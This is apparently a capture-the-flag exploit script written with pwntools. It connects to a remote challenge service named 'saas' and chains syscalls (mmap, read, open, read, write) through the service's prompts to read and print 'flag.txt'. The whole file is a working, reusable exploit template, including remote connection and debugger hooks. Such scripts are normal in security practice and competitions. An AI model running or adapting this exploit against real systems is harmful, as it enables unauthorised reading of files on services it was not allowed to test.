from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'saas'
elf = ELF(program,checksec=False)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = 'jh2i.com'
    port = '50016'
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
bss = elf.bss()

def sysc(rax,rdi,rsi,rdx,r10=0,r9=0,r8=0):
	sla("Enter rax (decimal): ",str(rax))
	sla("Enter rdi (decimal): ",str(rdi))
	sla("Enter rsi (decimal): ",str(rsi))
	sla("Enter rdx (decimal): ",str(rdx))
	sla("Enter r10 (decimal): ",str(r10))
	sla("Enter r9 (decimal): ",str(r9))
	sla("Enter r8 (decimal): ",str(r8))

#mmap(0,0x1000,7,22)
sysc(9,0,0x1000,7,0x22,0,0)
ru("Rax: ")
leak = int(xp.recvline()[:-1],16)
print hex(leak)

#read(0,leak,8)
sysc(0,0,leak,8,0,0,0)
sl("flag.txt")

#open(leak,0,1)
sysc(2,leak,0,1)
ru("Rax: ")
target = int(xp.recvline()[:-1],16)
#read(target,leak+8,0xff)
sysc(0,target,leak+8,0xff)
ru("Rax: ")
target = int(xp.recvline()[:-1],16)
#write(1,leak+8,0xff)
sysc(1,1,leak+8,0xff)


xp.interactive()
